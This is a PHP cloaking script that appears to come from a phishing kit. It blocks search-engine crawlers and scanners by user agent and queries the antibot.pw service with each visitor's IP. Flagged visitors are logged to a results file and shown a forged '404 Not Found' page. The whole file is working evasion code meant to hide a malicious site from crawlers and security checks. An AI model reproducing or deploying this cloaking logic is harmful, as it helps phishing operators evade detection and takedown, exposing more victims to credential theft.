<?php

if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Java') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler')  
		or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) {
			$content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
		    $save=fopen("../bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();

	}

if ($_SERVER['HTTP_USER_AGENT'] == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
	$content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
	$save=fopen("botsListUA.txt","a+");
	fwrite($save,$content);
	fclose($save);
	header("HTTP/1.0 404 Not Found");exit();
}


$config_antibot = '753f14842f9ea3f25adb711aa1460a58';

if(isset($config_antibot)) {
    function getUserIPszz()
    {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }else{
            $ip = $remote;
        }

        return $ip;
    }
    $ip = getUserIPszz();
    if($_SESSION['antibot_wasChecked'] == false || !isset($_SESSION['antibot_wasChecked'])){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_USERAGENT, "Antibot Blocker");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, "https://www.antibot.pw/api/v2-blockers?ip=".$ip."&apikey=".$config_antibot."&ua=".urlencode($_SERVER['HTTP_USER_AGENT']));
        $data = curl_exec($ch);
        curl_close($ch);
        $_SESSION['antibot_wasChecked'] = true;
        $x = json_decode($data,true);
        if($x['is_bot']){
            $_SESSION['is_bot']  = true;
            $file = fopen("antibot-block.txt","a");
            $message = $ip."\n";
            fwrite($file, $message);
            fclose($file);
            $click = fopen("result/total_bot.txt","a");
            fwrite($click,"<tr><td><p class=\"text-danger\">$ip|Antibot Blocker</p></td></tr>");
            fclose($click);
            header('HTTP/1.0 403 Forbidden');
            die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
          
        }else{
          $_SESSION['is_bot']  = false;
        }

    }
}


?>